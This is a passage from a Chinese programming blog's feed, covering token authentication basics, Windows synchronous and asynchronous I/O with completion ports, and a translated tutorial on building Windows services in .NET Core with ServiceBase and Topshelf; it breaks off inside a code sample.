<h1 id="传统身份验证"><a href="#传统身份验证" class="headerlink" title="传统身份验证"></a>传统身份验证</h1><p>&emsp;&emsp;HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。<br>&emsp;&emsp;解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。<br>&emsp;&emsp;上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session。  </p>
<h1 id="基于-Token-的身份验证"><a href="#基于-Token-的身份验证" class="headerlink" title="基于 Token 的身份验证"></a>基于 Token 的身份验证</h1><p>&emsp;&emsp;使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
<ul>
<li>客户端使用用户名跟密码请求登录</li>
<li>服务端收到请求，去验证用户名与密码</li>
<li>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</li>
<li>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</li>
<li>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</li>
<li>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows 内核原理 - 同步 I/O 与异步 I/O]]></title>
      <url>/2019/12/18/SyncIOAndAsyncIO/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/Jack-Blog/p/11385686.html" target="_blank" rel="noopener">https://www.cnblogs.com/Jack-Blog/p/11385686.html</a></p>
</blockquote>
<p>&emsp;&emsp;本片文章主要讲解同步 I/O 与异步 I/O 相关知识，希望通过编写本篇文章为起点，对 Windows 内核原理知识进行学习与梳理。发现并弥补遗漏的知识点并加以学习。同时通过理解 Windows 内核原理，设计出更好、更合理的应用程序。  </p>
<a id="more"></a>

<h1 id="I-O"><a href="#I-O" class="headerlink" title="I/O"></a>I/O</h1><p>&emsp;&emsp;I/O 即输入输出。在现在操作系统，输入输出是计算机完整功能必不可少的一部分。处理器负责各种计算任务，然后通过各种输入输出设备与外界进行交互。常见的输入输出设备包括键盘、鼠标、显示器、硬盘、网络适配器接口等。有了硬件设备，在软件层面上，使得操作系统通过以一致的方式与设备驱动交互从而的操控硬件设备。而应用程序通过统一的接口与系统内核进行交互。<br>&emsp;&emsp;Windows 从一开始就设计了可扩展的 I/O 接口。在应用层通过统一的 <code>Win32 API</code>，将 I/O 请求分配给正确的设备驱动程序。设备驱动程序调用设备控制器来操控硬件。而内核通过硬件抽象层与硬件进行交互。硬件抽象层提供了供内核和驱动调用的<a href="https://baike.baidu.com/item/%E4%BE%8B%E7%A8%8B" target="_blank" rel="noopener">例程</a>。</p>
<blockquote>
<p>&emsp;&emsp;例程就是系统提供的 API 或服务。</p>
</blockquote>
<p>&emsp;&emsp;在 Windows 下分为内核模式和用户模式。应用程序运行在用户模式下，操作系统和驱动程序运行在内核模式下。应用程序通过调用 <code>Win32 API</code> 与 Windows 内核交互。</p>
<figure class="image-box">
                <img src="580757-20190820191944686-76354328.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Windows 内核则通过设备驱动程序与设备控制器进行通讯，而设备控制器则直接操控硬件设备。<br>&emsp;&emsp;设备驱动程序分为即插即用驱动程序、内核扩展驱动程序和文件系统驱动程序。其中文件系统驱动程序用于接收 I/O 请求，然后将请求转换为真正的存储设备或网络设备的 I/O 请求。</p>
<figure class="image-box">
                <img src="580757-20190820191154015-231930516.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;设备控制器可以通过内存映射 I/O 的方式将设备的内存与主存映射，通过内存映射 I/O 后，处理器访问的就不是主存而是设备控制器的寄存器内存。但是这种方式的访问效率并不高，不适合大数据量 I/O 读写。通常硬盘和网络驱动器采用直接访问内存（DMA）的方式进行大量数据的 I/O 操作。DMA 需要硬件支持，硬件会有 DMA 控制器，在硬件执行 I/O 操作的时候，不会占用 CPU 的指令周期，DMA 控制器会和设备进行 I/O 操作。当数据传输完成后，DMA 则会通知处理器 I/O 操作完成。</p>
<figure class="image-box">
                <img src="580757-20190820191620016-424918110.png" alt title class>
                <p></p>
            </figure>

<h2 id="同步-I-O"><a href="#同步-I-O" class="headerlink" title="同步 I/O"></a>同步 I/O</h2><p>&emsp;&emsp;当我们要把文件从硬盘读取到内存时，硬盘的读取速度是远小于内存的写入速度的。因此当我们使用一个线程从硬盘读取文件到内存中时。通常需要等待硬盘将数据从硬盘读取到内存中，此时线程将被阻塞，但是不会消耗指令周期。当读取完毕时，线程继续执行后续操作。<br>&emsp;&emsp;虽然 DMA 执行的时候当前线程被阻塞，此时处理器可以获取另一个线程内核执行其他操作，由于线程是非常昂贵的资源，因此使用同步 I/O 的方式若需要并发执行时，需要大量的创建线程资源，这就产生了大量的线程上下文切换。</p>
<blockquote>
<p>&emsp;&emsp;在大多数 x86 和 x64 的多处理器，线程上下文切换时间间隔大约为 15ms。<br>&emsp;&emsp;CPU 每过大约 15ms 将 CPU 寄存器当前的线程上下文存回到该线程的上下文，然后该线程不在运行。然后系统检查剩下的可调度线程内核对象，选择一个线程的内核对象，将其上下文载入导 CPU 寄存器中。<br>&emsp;&emsp;关于 Windows 线程相关内容可以查阅《Windows via C/C++ 第五版》的第七章</p>
</blockquote>
<h2 id="异步-I-O"><a href="#异步-I-O" class="headerlink" title="异步 I/O"></a>异步 I/O</h2><p>&emsp;&emsp;前面提到了当硬件进行 I/O 传输时，实际上通常使用 DMA 技术执行 I/O 操作，不会占用 CPU 的指令周期。因此只要操作系统支持异步 I/O，则可以极大的提升系统性能，最大程度的降低线程数量，减少线程上下文切换产生的性能损失。</p>
<blockquote>
<p>&emsp;&emsp;在 Windows 下的异步 I/O 我们也可以称之为重叠（overlapped）I/O。重叠的意思是执行 I/O 请求的时间与线程执行其他任务的时间是重叠的，即执行真正 I/O 请求的时候，我们的工作线程可以执行其他请求，而不会阻塞等待 I/O 请求执行完毕。</p>
</blockquote>
<p>&emsp;&emsp;当使用一个线程向设备发出一个异步 I/O 请求时，该请求被传给设备驱动程序，设备驱动程序处理 I/O 请求时并不会等待 I/O 请求完成，而是将 I/O 请求加入到设备驱动程序的队列中，然后返回一个 I/O 处理中的信号。而实际的 I/O 操作则由设备驱动程序将 I/O 请求传给指定的硬件设备执行 I/O 操作。应用程序的线程并不需要挂起等待 I/O 请求的完成，从而可以继续执行其他任务。当某一时刻设备驱动程序完成了该 I/O 请求处理，设备控制器通过中断指令通知 I/O 请求完成，处理器则将通知 I/O 请求已完成。  </p>
<h2 id="I-O-完成通知"><a href="#I-O-完成通知" class="headerlink" title="I/O 完成通知"></a>I/O 完成通知</h2><p>&emsp;&emsp;在 Windows 中一共支持四种接收完成通知的方式。分别为触发设备内核对象、触发时间内核对象、可提醒 I/O 以及 I/O 完成端口。  </p>
<h3 id="触发设备内核"><a href="#触发设备内核" class="headerlink" title="触发设备内核"></a>触发设备内核</h3><p>&emsp;&emsp;当设备驱动加载时会创建一个设备驱动对象，设备驱动程序还会为设备创建对应的设备对象。设备对象代表的是每一个物理设备或逻辑设备。设备对象描述了一个特定设备的状态信息，包括 I/O 请求的状态。在通过异步 I/O 将 I/O 请求添加到队列之前，会将设备内核对象设置为未触发，此时就可以使用该设备内核对象进行同步操作，当 I/O 请求完成后则会将设备内核对象设置为触发状态。使用设备内核对象进行线程同步时，无法区分当前完成通知的 I/O 是读操作还是写操作，因此无论是读还是写都会将其状态设置为触发状态。  </p>
<h3 id="事件内核对象"><a href="#事件内核对象" class="headerlink" title="事件内核对象"></a>事件内核对象</h3><p>&emsp;&emsp;通过设备内核对象进行 I/O 通知由于无法区分读写操作，因此并没有什么用。通过事件内核对象我们可以将读写事件分离。在调用读写操作的时候会返回对应的读写事件内核对象。这样我们就可以等待对应的事件内核对象知道是什么 I/O 操作完成。我们可以通过等待多个事件内核对象，但是一次性最多只能等待 64 个事件内核对象，即一个线程最多只能创建 64 个事件内核对象进行等待。若需要监控上万个连接，则需要创建上百个线程进行监控。  </p>
<h3 id="可提醒-I-O"><a href="#可提醒-I-O" class="headerlink" title="可提醒 I/O"></a>可提醒 I/O</h3><p>&emsp;&emsp;在系统创建线程的时候会创建一个与线程相关的队列，该队列被称为异步调用（APC）队列，当发出一个 I/O 请求时，我们可以告诉设备驱动程序在调用线程的 APC 队列中添加一项完成函数，在 I/O 完成通知时调用完成函数进行回调。I/O 完成通知最大的问题是，请求时哪个线程调用的，必须由哪个线程回调。它不支持负载均衡机制。  </p>
<h3 id="完成端口"><a href="#完成端口" class="headerlink" title="完成端口"></a>完成端口</h3><p>&emsp;&emsp;I/O 完成端口的设计理论依据是并发编程的线程数必须有一个上限，即最佳并发线程数为 CPU 的逻辑线程数。I/O 完成端口充分的发挥了并发编程的优势的同时又避免了线程上下文切换带来的性能损失。<br>&emsp;&emsp;完成端口可能是最复杂的内核对现象，但是它又是 Windows 下性能最佳的 I/O 通知方式。<br>&emsp;&emsp;首先我们需要创建一个 I/O 完成端口，创建完成端口的时候可以指定线程数量。通过将设备与 I/O 完成端口进行关联。此使我们发出的 I/O 请求时，系统内核返回 <code>IO_PENDDING</code> 状态，然后线程就可以继续处理其他事情。而 DMA 继续执行 I/O 操作，将数据从设备读取到设备控制器的缓冲区中，并对其进行必要的校验后，将数据通过系统总线传输到内存中。当数据传输完成后，DMA 发出中断指令通知数据传输完毕，系统则会通过前面创建的 I/O 线程将 I/O 完成请求加入到 I/O 完成队列中。<br>&emsp;&emsp;然后我们通过调用 <code>Win32 API</code> 就可以获取到对应的设备 I/O 完成请求通知，通知会将 I/O 完成请求从完成队列移除。  </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>同步 I/O 会阻塞线程，想要提高执行速度必须增加线程，但是会由于线程上下文切换造成性能损失。</li>
<li>Windows 下大约每 15ms 会进行一次线程调度。减少 Windows 线程能降低内存占用（默认线程栈大小为 1M），降低线程上下文切换造成的性能损失。</li>
<li>Windows 支持原生的异步 I/O。异步 I/O 也可以称为重叠 I/O。使用异步 I/O 时线程不会阻塞，系统底层将每个 I/O 请求生成 I/O 请求包（IRP）加入到设备驱动程序的请求队列中，然后直接返回 <code>IO_PENDDING</code> 状态表示请求受理成功，当底层设备完成了真实的 I/O 请求后会通过中断控制器通过中断操作通知 CPU，CPU 会调度一个线程通知上层设备驱动程序,将完成通知加入到完成队列中。此时上层应用即可获取到完成通知。</li>
<li>完成端口是 Windows 下性能最佳的完成通知方式。它最大程度的减少线程上下文切换。</li>
<li>使用异步 I/O 和完成端口实现高性能 I/O 操作的主要原因有三点。一是减少 I/O 上下文切换；二是异步不阻塞线程，预先提供一个 socket 用于连接，而不是接受到时再创建 socket（socket 创建也是比较耗资源的）；三是避免了内存复制。</li>
<li>如何减少线程，如何避免内存复制，如何提高线程利用率，避免线程阻塞。以上几点是所有高性能框架或高性能应用程序必备的条件。</li>
</ol>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol>
<li><a href="https://www.cnblogs.com/liqiu/p/3211746.html" target="_blank" rel="noopener">cpu 内存访问速度，磁盘和网络速度</a></li>
<li><a href="http://qiusuoge.com/12451.html" target="_blank" rel="noopener">手把手教你玩转 SOCKET 模型：完成端口（Completion Port）详解</a></li>
<li><a href="https://www.cnblogs.com/dawen/archive/2011/05/18/2050358.html" target="_blank" rel="noopener">Reactor 与 Proactor 的概念</a></li>
<li><a href="https://www.zhihu.com/question/26943938/answer/68773398" target="_blank" rel="noopener">如何深刻理解 reactor 和 proactor？</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/fileio/i-o-completion-ports" target="_blank" rel="noopener">I/O Completion Ports</a></li>
<li>《Windows via C/C++ 第五版》</li>
<li>《Windows内核原理与实现》</li>
<li><a href="https://blog.csdn.net/sac761/article/details/52456385" target="_blank" rel="noopener">WaitForMultipleObjects 用法详解，一看就懂</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 计算机原理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 .NET Core 创建 Windows 服务]]></title>
      <url>/2019/12/14/CreatingWindowsServicesInDotNetCore/</url>
      <content type="html"><![CDATA[<blockquote>
<p>作者：Dotnet Core Tutorials<br>原文：</p>
<ul>
<li>Part 1 - The “Microsoft” Way: <a href="https://dotnetcoretutorials.com/2019/09/19/creating-windows-services-in-net-core-part-1-the-microsoft-way/" target="_blank" rel="noopener">https://dotnetcoretutorials.com/2019/09/19/creating-windows-services-in-net-core-part-1-the-microsoft-way/</a>  </li>
<li>Part 2 - The “Topshelf” Way: <a href="https://dotnetcoretutorials.com/2019/09/27/creating-windows-services-in-net-core-part-2-the-topshelf-way/" target="_blank" rel="noopener">https://dotnetcoretutorials.com/2019/09/27/creating-windows-services-in-net-core-part-2-the-topshelf-way/</a>  </li>
<li>Part 3 – The “.NET Core Worker” Way: <a href="https://dotnetcoretutorials.com/2019/12/07/creating-windows-services-in-net-core-part-3-the-net-core-worker-way/" target="_blank" rel="noopener">https://dotnetcoretutorials.com/2019/12/07/creating-windows-services-in-net-core-part-3-the-net-core-worker-way/</a></li>
</ul>
<p>译者：Lamond Lu<br>译文：</p>
<ul>
<li>Part 1 - 使用官方推荐方式: <a href="https://www.cnblogs.com/lwqlun/p/11621186.html" target="_blank" rel="noopener">https://www.cnblogs.com/lwqlun/p/11621186.html</a>  </li>
<li>Part 2 - 使用 Topshelf 方式: <a href="https://www.cnblogs.com/lwqlun/p/11625789.html" target="_blank" rel="noopener">https://www.cnblogs.com/lwqlun/p/11625789.html</a>  </li>
<li>Part 3 - 使用 .NET Core 工作器方式: <a href="https://www.cnblogs.com/lwqlun/p/12038062.html" target="_blank" rel="noopener">https://www.cnblogs.com/lwqlun/p/12038062.html</a>  </li>
</ul>
</blockquote>
<a id="more"></a>

<figure class="image-box">
                <img src="65831-20191005211343706-2050001309.png" alt title class>
                <p></p>
            </figure>

<h1 id="使用官方推荐方式"><a href="#使用官方推荐方式" class="headerlink" title="使用官方推荐方式"></a>使用官方推荐方式</h1><p>&emsp;&emsp;创建 Windows 服务来运行批处理任务或者运行后台任务，是一种非常常见的模式，但是由于云服务（Amazon Lambda, Azure WebJobs 以及 Azure Functions）的激增，你可能不会经常使用 Windows 服务了。个人而言，我非常喜欢使用 Azure WebJobs，因为我可以直接编写一个控制台程序，而不需要考虑如何云中运行它，一个批处理文件可以将其装换成一个自动化任务，并且可以保证 7 * 24 小时的运行。<br>&emsp;&emsp;但是也许你还没有使用云服务，或者你有一堆要作为 Windows 服务运行的旧版应用程序需要转换为 .NET Core，但是不能完全将他们转换为 “ 无服务器 ”（serverless）应用。 那么这边文章就是适合你的。<br>&emsp;&emsp;在许多方面，.NET Core 中的 Windows 服务和 .NET Framework 中的 Windows 服务完全相同。但是，在编写服务的时候，你可能会遇到一些小问题。此外，本文中，我们仅介绍 “ Microsoft ” 方式的 Windows 服务创建，在后续，我会继续介绍如何使用第三方库 TopShelf 来简化这个过程。  </p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>&emsp;&emsp;由于 Visual Studio 没有提供创建 Windows 服务的模板，所以我们需要通过创建控制台程序的方式来创建一个 Windows 服务。<br>创建完成之后，我们需要安装一个 Nuget 程序包，这个程序包会将一些 Windows 特定的 API 添加到 .NET Core 中，这些 API 实际上已经在完整框架中提供了，但是其中许多是 Windows 特有的，例如 Windows 服务。因此, 它们并没有包含在 .NET Core 的基础库中，但是可以通过将 Nuget 程序包的方式引入到 .NET Core 中。<br>&emsp;&emsp;下面我们就可以在 Package Manager Console 中输入以下命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Microsoft.Windows.Compatibility</span><br></pre></td></tr></table></figure>

<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>&emsp;&emsp;以上引入的 Nuget 程序包中，最让我们感兴趣的是 <code>ServiceBase</code> 类。这是一个用于编写 Windows 服务的基类，它提供了一系列的事件钩子，包含服务启动、结束、暂停等。<br>&emsp;&emsp;下面呢，我们将在代码中创建一个类，这个类负责将一些简单的日志输出到一个临时文件中。我们将使用这个例子来了解其中的原理。我们的代码如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">LoggingService</span> : <span class="title">ServiceBase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="keyword">string</span> _logFileLocation = <span class="string">@"C:\temp\servicelog.txt"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Log</span>(<span class="params"><span class="keyword">string</span> logMessage</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Directory.CreateDirectory(Path.GetDirectoryName(_logFileLocation));</span><br><span class="line">        File.AppendAllText(_logFileLocation, DateTime.UtcNow.ToString() + <span class="string">" : "</span> + logMessage + Environment.NewLine);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnStart</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Log(<span class="string">"Starting"</span>);</span><br><span class="line">        <span class="keyword">base</span>.OnStart(args);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnStop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Log(<span class="string">"Stopping"</span>);</span><br><span class="line">        <span class="keyword">base</span>.OnStop();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnPause</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Log(<span class="string">"Pausing"</span>);</span><br><span class="line">        <span class="keyword">base</span>.OnPause();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;所以这里你会注意到，我们的类是继承了 <code>ServiceBase</code> 类，并且我们重写了几个事件方法，输出了一些日志。在服务启动时，会触发 <code>OnStart</code> 事件，在服务终止的时候，会触发 <code>OnStop</code> 事件。这里我们不应该将过于繁重的任务放置在 <code>OnStart</code> 事件中来处理。<br>&emsp;&emsp;如果我们想从 <code>Main</code> 方式中启动这个服务，代码非常的简单。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ServiceBase.Run(<span class="keyword">new</span> LoggingService());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;以上就是全部代码。  </p>
<h2 id="服务部署"><a href="#服务部署" class="headerlink" title="服务部署"></a>服务部署</h2><p>&emsp;&emsp;在发布服务的时候，我们不可能仅依靠 Visual Studio 来构建我们所需要的服务，我们还需要专门针对 Windows 运行时进行构建。为此，我们需要在项目根目录的命令提示符下运行以下命令。注意，这里我们传入了一个 <code>-r</code> 标记来告诉它要构建那个平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet publish -r win-x64 -c Release</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;命令运行完毕之后，我们可以检查以下 <code>/bin/release/netcoreappX.X/publish</code> 目录，我们可以找到所有的发布代码，但是最重要的是，这里我们可以得到一个可执行的 exe 文件。如果我们不指定运行时，我们只会获得一个 .NET Core 的 dll 程序集，使用这个程序集，我们是没有办法创建 Windows 服务的。<br>&emsp;&emsp;现在我们可以将这个发布目录移动带其他的任何地方，但是现在我们就暂时使用当前的发布目录。<br>&emsp;&emsp;下一步，我们需要使用管理员角色打开一个命令提示符，然后输入一下命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create TestService BinPath=C:\full\path\to\publish\dir\WindowsServiceExample.exe</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>SC</code> 命令是一个标准的 Windows 命令（与 .NET Core 无关），它可以用来安装 Windows 服务。这里我们将我们的测试服务命名为 <code>TestService</code>，更重要的是，我们通过 <code>BinPath</code> 参数指定了可执行 exe 文件。<br>&emsp;&emsp;运行之后，我们应该会得到以下结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SC] CreateService SUCCESS</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后我们要做的就是启动服务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start TestService</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在我们可以查看一下我们的日志文件，查看服务的运行情况。<br>&emsp;&emsp;如果想要停止并删除服务，我们可以使用一下命令。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop TestService</span><br><span class="line">sc delete TestService</span><br></pre></td></tr></table></figure>

<h2 id="服务调试"><a href="#服务调试" class="headerlink" title="服务调试"></a>服务调试</h2><p>&emsp;&emsp;在这里，我真的认为，使用 “ Microsoft “ 的方式注定会失败。因为调试服务实在是太繁琐了。<br>&emsp;&emsp;首先，我们将 <code>ServiceBase</code> 中重写的方法设置为受保护，这意味着我们无法在类之外访问它们，这使得调试它们变得更加困难。这里我发现最好的方法是为每个事件提供一个 public 方法, 并在受保护方法中调用这些 public 方法来完成功能，这虽然有点混乱，</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnStartPublic</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Log(<span class="string">"Starting"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnStart</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    OnStartPublic(args);</span><br><span class="line">    <span class="keyword">base</span>.OnStart(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;但是至少我们可以做如下了事情了。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> loggingService = <span class="keyword">new</span> LoggingService();</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>)   <span class="comment">//Some check to see if we are in debug mode (Either #IF Debug etc or an app setting)</span></span><br><span class="line">    &#123;</span><br><span class="line">        loggingService.OnStartPublic(<span class="keyword">new</span> <span class="keyword">string</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//Just spin wait here. </span></span><br><span class="line">            Thread.Sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Call stop here etc. </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ServiceBase.Run(<span class="keyword">new</span> LoggingService());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;你的另一个选择是，在调试模式下进行项目发布，安装服务，然后附加调试器。实际上，这是 Microsoft 建议你使用的方式，但是我认为这简直一团糟。  </p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>&emsp;&emsp;实际上，我们可以在这里做一些其他非常有用的事情， 比如我们可以通过创建一个 install.bat 批处理文件来为我们运行 SC Create 命令。但我认为，上面我们看到的调试问题，已经让我不再想使用这种方式了。幸运的是，有一个名为 <code>Topshelf</code> 的库可以帮助我们减轻很多麻烦，在本系列的下一部分中，我们将研究如何它。  </p>
<h1 id="使用-Topshelf-方式"><a href="#使用-Topshelf-方式" class="headerlink" title="使用 Topshelf 方式"></a>使用 Topshelf 方式</h1><p>&emsp;&emsp;在前一篇文章中，我给大家介绍了，如何基于微软推荐方式使用 .NET Core 创建 Windows 服务。我们发现使用这种方式，我们很容易就可以搭建和运行一个 Windows 服务，但是问题是使用这种方式，代码调试将非常困难。<br>&emsp;&emsp;那么现在就是 <code>Topshelf</code> 出场的时候了。<code>Topshelf</code> 是一个 .NET Standard 库，它消除了在 .NET Framework 和 .NET Core 中创建 Windows 服务的那些麻烦。  </p>
<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>&emsp;&emsp;与微软推荐方式类似，这里 Visual Studio 并没有提供一个基于 <code>Topshelf</code> 创建 Windows 服务的模板，所以我们依然需要通过创建普通控制台程序的方式，来创建一个 Windows 服务。<br>&emsp;&emsp;然后，我们需要通过 Package Manager Console，运行以下命令，安装 <code>Topshelf</code> 类库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Topshelf</span><br></pre></td></tr></table></figure>

<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><p>&emsp;&emsp;下面我们就来使用 <code>Topshelf</code> 重构之前的服务代码。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LoggingService</span> : <span class="title">ServiceControl</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="keyword">string</span> _logFileLocation = <span class="string">@"C:\temp\servicelog.txt"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Log</span>(<span class="params"><span class="keyword">string</span> logMessage</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Directory.CreateDirectory(Path.GetDirectoryName(_logFileLocation));</span><br><span class="line">        File.AppendAllText(_logFileLocation, </span><br><span class="line">            DateTime.UtcNow.ToString() + <span class="string">" : "</span> + logMessage + Environment.NewLine);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> 